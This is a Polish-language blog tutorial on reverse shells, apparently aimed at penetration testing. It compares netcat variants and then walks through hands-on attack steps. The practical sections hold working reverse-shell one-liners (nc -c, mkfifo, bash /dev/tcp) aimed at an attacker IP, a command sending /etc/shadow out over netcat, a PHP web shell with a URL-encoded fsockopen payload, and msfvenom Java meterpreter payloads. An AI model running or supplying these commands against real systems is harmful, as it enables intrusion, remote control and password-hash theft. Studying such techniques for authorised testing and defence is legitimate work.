---
title: "Reverse Shell"
excerpt: " "
comments: true
categories:
  - Hacking
tags:
  - Hacking
  - reverse shell
  - tools
header:
  overlay_image: /assets/images/pasek-hack.png
---

# Co to takiego jest i do czego służy Reverse Shell?
**Reverse shell** (czyli odwrócone połączenie powłoki) to technika często wykorzystywana w dziedzinie cyberbezpieczeństwa. Polega ona na ustanowieniu połączenia zdalnego z systemem komputerowym i zdalnym uruchomieniu powłoki (w wypadku **Linuxa** Sh/Bash). W tradycyjnym połączeniu zdalnym, atakujący nawiązuje połączenie z ofiarą. Natomiast w przypadku reverse shell, to ofiara nawiązuje połączenie z atakującym. Zajmiemy się głównie **Reverse Shellem**.
{: .text-justify}
# Jakich programów do tego potrzebuje?
Zajmiemy się tutaj Linuxem. Opisze programy na ten system, chociaż na **Windowsa** też jest do tego program o nazwie **Nc**. Niestety wersji **Nc** na **Linuxa** jest dosyć dużo i mogą wprowadzić pewne zamieszanie:
{: .text-justify}
## GNU Netcat (netcat-traditional)
Ta wersja jest najbardziej - jakby to powiedzieć - pierwotna. Program został napisany przez osobę przedstawiającą się jako Hobbit. Ciekawostką jest to, że nie działa wyświetlenie helpa przez wpisanie _nc --help_. Spotykany jest tutaj dosyć niski numer wersji (u mnie na rok 2023 - [v1.10-47]). W odróżnieniu od **OpenBSD Netcat (netcat-openbsd)** ta wersja posiada przełączniki _-c_ lub _-e_, pozwalające uruchomić i przekierować **Basha**, **Sh** itd. Pakiet, który jest w **Debianie** nazywa się _netcat-traditional_. Po wykonaniu komendy: 
{: .text-justify}
```bash
nc -help 
```
Dostajemy mniej więcej taki wynik:
{: .text-justify}
```bash
[v1.10-47]
connect to somewhere:   nc [-options] hostname port[s] [ports] ... 
listen for inbound:     nc -l -p port [-options] [hostname] [port]
options:
        -c shell commands       as `-e'; use /bin/sh to exec [dangerous!!]
        -e filename             program to exec after connect [dangerous!!]
        -b                      allow broadcasts
        -g gateway              source-routing hop point[s], up to 8
        -G num                  source-routing pointer: 4, 8, 12, ...
        -h                      this cruft
        -i secs                 delay interval for lines sent, ports scanned
        -k                      set keepalive option on socket
        -l                      listen mode, for inbound connects
        -n                      numeric-only IP addresses, no DNS
        -o file                 hex dump of traffic
        -p port                 local port number
        -r                      randomize local and remote ports
        -q secs                 quit after EOF on stdin and delay of secs
        -s addr                 local source address
        -T tos                  set Type Of Service
        -t                      answer TELNET negotiation
        -u                      UDP mode
        -v                      verbose [use twice to be more verbose]
        -w secs                 timeout for connects and final net reads
        -C                      Send CRLF as line-ending
        -z                      zero-I/O mode [used for scanning]
port numbers can be individual or ranges: lo-hi [inclusive];
hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
```
Port z pakietu **Nmap** posiada wysoki numer (7.70) i działa wpisanie _nc --help_. Po tym też można poznać, jaka to jest wersja, chociaż nie tylko.
{: .text-justify}
## OpenBSD Netcat (netcat-openbsd)
Ta wersja została przepisana z wersji tradycyjnej, dodano parę funkcji, ale niestety usunięto przełączniki _-c_ i _-e_. Ma to związek z tym, że ta implementacja jest jest silnie związana z bezpieczeństwem. Dodano bardzo przydatny przełącznik _-N_, który się przydaje przy przesyłaniu plików. Pakiet pod Debiana nazywa się _netcat-openbsd_. Po wykonaniu komendy (_--help_ do końca nie działa) widzimy: 
{: .text-justify}
```bash
nc -help
```
```bash
szikers@opensuse15-test1:~> nc -help 
usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
          [-m minttl] [-O length] [-P proxy_username] [-p source_port]
          [-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout]
          [-X proxy_protocol] [-x proxy_address[:port]]           [destination] [port]
        Command Summary:
                -4              Use IPv4
                -6              Use IPv6
                -b              Allow broadcast
                -C              Send CRLF as line-ending
                -D              Enable the debug socket option
                -d              Detach from stdin
                -F              Pass socket fd
                -h              This help text
                -I length       TCP receive buffer length
                -i interval     Delay interval for lines sent, ports scanned
                -k              Keep inbound sockets open for multiple connects
                -l              Listen mode, for inbound connects
                -M ttl          Outgoing TTL / Hop Limit
                -m minttl       Minimum incoming TTL / Hop Limit
                -N              Shutdown the network socket after EOF on stdin
                -n              Suppress name/port resolutions
                -O length       TCP send buffer length
                -P proxyuser    Username for proxy authentication
                -p port         Specify local port for remote connects
                -q secs         quit after EOF on stdin and delay of secs
                -r              Randomize remote ports
                -S              Enable the TCP MD5 signature option
                -s source       Local source address
                -T keyword      TOS value
                -t              Answer TELNET negotiation
                -U              Use UNIX domain socket
                -u              UDP mode
                -V rtable       Specify alternate routing table
                -v              Verbose
                -W recvlimit    Terminate after receiving a number of packets
                -w timeout      Timeout for connects and final net reads
                -X proto        Proxy protocol: "4", "5" (SOCKS) or "connect"
                -x addr[:port]  Specify proxy address and port
                -Z              DCCP mode
                -z              Zero-I/O mode [used for scanning]
        Port numbers can be individual or ranges: lo-hi [inclusive]
```
## Nmap-ncat (od autora Network Mapper)
Żeby jeszcze bardziej namieszać, jest jeszcze jest **Ncat** od osoby, która napisała program **Nmap (Network Mapper)**, czyli od Gordona Lyona. Pogram charakteryzuje się dosyć wysoką wersją (w porównaniu do pierwowzoru). Na szczęście (albo i nie) są przełączniki _-c_ i _-e_ pozwalające uruchomić **Bash** lub inną konsolę. Na **Redhacie** pakiet nazywa się _nmap-ncat_, zaś na **Debianie** po prostu _ncat_. Zauważyłem, że na **Debianie** możemy mieć dwa **Netcaty**. Jeżeli są dwa, to ten pierwotny nazywa _nc.traditional_, drugi zaś normalnie _nc_. Help naszego programu od **Nmapa** wygląda tak:
{: .text-justify}
```bash
nc --help
```
```bash
Ncat 7.70 ( https://nmap.org/ncat )
Usage: ncat [options] [hostname] [port]

Options taking a time assume seconds. Append 'ms' for milliseconds,
's' for seconds, 'm' for minutes, or 'h' for hours (e.g. 500ms).
  -4                         Use IPv4 only
  -6                         Use IPv6 only
  -U, --unixsock             Use Unix domain sockets only
  -C, --crlf                 Use CRLF for EOL sequence
  -c, --sh-exec <command>    Executes the given command via /bin/sh
  -e, --exec <command>       Executes the given command
      --lua-exec <filename>  Executes the given Lua script
  -g hop1[,hop2,...]         Loose source routing hop points (8 max)
  -G <n>                     Loose source routing hop pointer (4, 8, 12, ...)
  -m, --max-conns <n>        Maximum <n> simultaneous connections
  -h, --help                 Display this help screen
  -d, --delay <time>         Wait between read/writes
  -o, --output <filename>    Dump session data to a file
  -x, --hex-dump <filename>  Dump session data as hex to a file
  -i, --idle-timeout <time>  Idle read/write timeout
  -p, --source-port port     Specify source port to use
  -s, --source addr          Specify source address to use (doesn't affect -l)
  -l, --listen               Bind and listen for incoming connections
  -k, --keep-open            Accept multiple connections in listen mode
  -n, --nodns                Do not resolve hostnames via DNS
  -t, --telnet               Answer Telnet negotiations
  -u, --udp                  Use UDP instead of default TCP
      --sctp                 Use SCTP instead of default TCP
  -v, --verbose              Set verbosity level (can be used several times)
  -w, --wait <time>          Connect timeout
  -z                         Zero-I/O mode, report connection status only
      --append-output        Append rather than clobber specified output files
      --send-only            Only send data, ignoring received; quit on EOF
      --recv-only            Only receive data, never send anything
      --allow                Allow only given hosts to connect to Ncat
      --allowfile            A file of hosts allowed to connect to Ncat
      --deny                 Deny given hosts from connecting to Ncat
      --denyfile             A file of hosts denied from connecting to Ncat
      --broker               Enable Ncat's connection brokering mode
      --chat                 Start a simple Ncat chat server
      --proxy <addr[:port]>  Specify address of host to proxy through
      --proxy-type <type>    Specify proxy type ("http" or "socks4" or "socks5")
      --proxy-auth <auth>    Authenticate with HTTP or SOCKS proxy server
      --ssl                  Connect or listen with SSL
      --ssl-cert             Specify SSL certificate file (PEM) for listening
      --ssl-key              Specify SSL private key (PEM) for listening
      --ssl-verify           Verify trust and domain name of certificates
      --ssl-trustfile        PEM file containing trusted SSL certificates
      --ssl-ciphers          Cipherlist containing SSL ciphers to use
      --ssl-alpn             ALPN protocol list to use.
      --version              Display Ncat's version information and exit
```
# Jak to jest w praktyce?
Uff, wstęp już przeszliśmy, czas przejść do działania. 
{: .text-justify}
## Nasłuchiwanie
{: .text-justify}
Na szczęście aby nasłuchiwać, nie trzeba się przejmować z jakiej rodziny jest **nc**. Użycie tego programu, mimo że z dwóch rodzin, wygląda to podobnie. Później jeszcze opiszę moduł nasłuchujący z **Metasploita**.
{: .text-justify}
### Netcat (tradycyjny i OpenBSD)
{: .text-justify}
Wpisujemy
{: .text-justify}
```bash
nc -lvn -p 1337
```
Pokazuje się komunikat:
{: .text-justify}
```bash
Listening on 0.0.0.0 1337
```
Jeżeli się połączymy to powinniśmy widzieć mniej więcej taką odpowiedź:
{: .text-justify}
```bash
Connection received on 172.x.x.xx 37052
```
## Metasploit - moduł exploit(multi/handler)
Włączamy **Metasploit** i uruchamiamy poniższe komendy:
{: .text-justify}
```bash
msf6 exploit(multi/handler) > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lport 1337
lport => 1337
msf6 exploit(multi/handler) > set lhost eth0
lhost => 172.16.1.89
msf6 exploit(multi/handler) > run -j

[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 172.16.1.89:1337 
```
Jeżeli wszystko poszło dobrze:
{: .text-justify}
```bash
msf6 exploit(multi/handler) > [*] Command shell session 2 opened (172.16.1.89:1337 -> 172.16.1.33:58520) at 2023-12-19 18:29:07 +0100

msf6 exploit(multi/handler) > sessions 

Active sessions
===============

  Id  Name  Type             Information  Connection
  --  ----  ----             -----------  ----------
  2         shell sparc/bsd               172.16.1.89:1337 -> 172.16.1.33:58520 (172.16.1.33)
  msf6 exploit(multi/handler) > sessions 2
[*] Starting interaction with 2...
```
Powłoką na **Metasploicie** nie będziemy się zajmować, podałem tylko przykład jako ciekawostkę. Wróćmy jednak do _nc_ wysyłającego shell.
{: .text-justify}
# Wysyłanie
I tutaj zaczynają się niestety schody. **Nc** **Nc** w tym wypadku nierówny.
{: .text-justify}
## GNU Netcat (netcat-traditional)
Tutaj możemy po prostu tak wysłać konsolę (podobnie jest w **nc** od **Nmapa**)
{: .text-justify}
```bash
nc 172.16.1.89 1337 -c /bin/bash
```
Jeżeli wszystko wykonaliśmy poprawnie powinno być połączenie.
{: .text-justify}
```bash
connect to [172.16.1.89] from (UNKNOWN) [172.16.1.33] 44962
```
## OpenBSD Netcat (netcat-openbsd)
Tu jest już gorzej. **Nc** z **OpenBSD** nie ma przełącznika **-c** ani **-e**, co pozwala uruchomić **shell**, ale na szczęście jest opisane w podręczniku, jak zrobić przekierowanie z **Basha** (oczywiście ta opcja też działa z nc traditional).
{: .text-justify}
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash 2>&1 | nc 172.16.1.89 1337 > /tmp/f
```
# Mam połączenie, ale i nie mam znaku zachęty
Nie ma sprawy, można to naprawić na parę sposobów. Na konsoli gdzie odbieramy połączenie wklepujemy.
{: .text-justify}
## Python
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
## Script
```bash
script /dev/null -c /bin/bash
```
```bash
Script started, file is /dev/null
[root@rocky8-test1 ~]# 
```
Polecam ten drugi sposób z uruchomieniem programu **Script**
{: .text-justify}
# Ale skąd te krzaki?
```bash
[root@rocky8-test1 ~]# ^[[D^[[D^[[D^[[D
```
Po wejściu na konsolę, podczas ruszania strzałkami są **krzaki**. również po naciśnięciu **ctrl+c** wychodzi się z konsoli. Jest jednak na to rada. Jednak od razu wspomnę, że nie za dobrze to działa, kiedy **puszczamy Shella** przez _bash -i &> /dev/tcp/172.16.1.89/1337 0>&1_. Jednak z **Nc** działa prawie, że idealnie. Więc kiedy jesteśmy już w konsoli wciskamy **ctrl+z** (zadanie w tle)
{: .text-justify}
```bash
[root@rocky8-test1 ~]# ^Z      
[1]+  Zatrzymano              nc -lvnp 1337
```
Następnie:
{: .text-justify}
```bash
stty raw -echo; fg
reset xterm
```
Teraz można dowolnie sterować strzałkami (_ctrl+c_ nie zamyka konsoli):
{: .text-justify}
```bash
[root@rocky8-test1 ~]# ^C ^C
```
# Wyszedłem z konsoli, ale nic nie mogę napisać
Spoko, wystarczy że wpiszesz:
{: .text-justify}
```bash
stty sane
```
# Na przejętej maszynie nie ma Nc
Nie przejmuj się, możesz **Basha** użyć do przerzucenia **Basha** :smiley: Jednak ta metoda działa już na przejętej maszynie
{: .text-justify}
```bash
bash -i &> /dev/tcp/172.16.1.89/1337 0>&1
```
# Co jeszcze mogę zrobić z Nc?
## Wysyłanie plików
Możesz przerzucić plik - akurat tutaj polecam **Nc** w wersji **OpenBSD** - w ten sposób:
{: .text-justify}
### Przejęta maszyna 
Jak już wcześniej wspomniałem przełącznik _-N_ działa tylko na **Nc** z **OpenBSD**. Po przesłaniu pliku program sam kończy prace. Niestety w przypadku innego - tradycyjnego, z pakietu _nmap_ - trzeba po wysłaniu pliku, wcisnąć _ctrl+c_ aby zakończyć.
{: .text-justify}
```bash
cat /etc/shadow | nc -vN 172.16.1.89 1337 
```
```bash
Connection to 172.16.1.89 1337 port [tcp/menandmice-dns] succeeded!
```
### Nasza maszyna
```bash
nc -lvnp 1337 > shadow
```
## Przekierowanie portów
Tak, tutaj też można użyć **Nc**, chociaż najlepiej się do tego nadaje **Socat**. Poniżej przykład użycia:
{: .text-justify}
```bash
nc -nlktp 8001 -c "nc 127.0.0.1 8000"
```
# PHP
Załóżmy, że mamy dostęp do jakiegoś serwera, np. o ip **172.16.1.123** gdzie możemy wrzucać pliki z rozszerzeniem _php_ **(http://server/uploads/)**. Naszym celem jest połączyć się stamtąd na naszą maszynę. Można to zrobić w ten sposób:
{: .text-justify}
## shell.php
Należy stworzyć plik _shell.php_:
{: .text-justify}
```php
<?php
echo shell_exec($_REQUEST['cmd']);
?>
```
## Nasłuchiwanie
Włączamy jak zwykle u siebie nasłuchiwanie:
{: .text-justify}
```bash
nc -lvp 1337
```
## Payload
Przygotowujemy **payload**:
{: .text-justify}
```bash
php -r '$sock=fsockopen("172.16.1.89",1337);exec("bash <&3 >&3 2>&3");'
```
Konwertujemy na format _URL_. Można to zrobić na stronie [urlencoder](https://www.urlencoder.org/). Wychodzi coś takiego:
{: .text-justify}
```bash
php%20-r%20%27%24sock%3Dfsockopen%28%22172.16.1.89%22%2C1337%29%3Bexec%28%22bash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```
Doklejamy **payload** do do naszego linku:
{: .text-justify}
```bash
http://172.16.1.123/uploads/shell.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22172.16.1.89%22%2C1337%29%3Bexec%28%22bash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```
Jezeli wszystko przebiegło poprawnie powinniśmy mieć dostęp do **Shella**.
{: .text-justify}
# Payloady
Reverse Shell możemy tworzyć ręcznie, ale bardzo dobrze się nadaje do tego celu polecenie _msvenom_ ze wspomnianego wcześniej **Metasploita**. Tym razem będzie przykład reverse Shell uruchomionego przez Javę. Stworzyć ładunek można poleceniem:
{: .text-justify}
## Metasploit
### Tworzenie ładunku
```bash
msfvenom --platform java -f jar -p java/meterpreter/reverse_tcp LPORT=1337 LHOST=172.16.1.89 -o shell.jar
```
### Ustawienia na Metasploicie
```bash
use exploit/multi/handler
set payload payload/java/shell/reverse_tcp
set lport 1337
```
## Nc
### Tworzenie ładunku
```bash
msfvenom -p java/shell_reverse_tcp LPORT=1337 -f jar -o shell.jar
```
### Nasłuchiwanie
```bash
nc -lvn -p 1337
```
Odpalamy ładunek na przejętym koncie poleceniem, Tu już nie jest ważny **listener**:
{: .text-justify}
```bash
/usr/bin/java -jar shell.jar
```
Trochę jest zmylający parametr **LHOST**, bo to nie jest do końca _localhost_, ale w tym przypadku adres gdzie łączy się nasz ładunek.
{: .text-justify}
# Koniec
I to już koniec. Mam nadzieję, że wyjaśniłem trochę sprawę. Na koniec bonus w postaci [linka](https://www.revshells.com/) do generatora **Shelli**. Jeżeli masz coś ciekawego do dodania, lub znalazłeś poważny błąd, daj znać.
{: .text-justify}
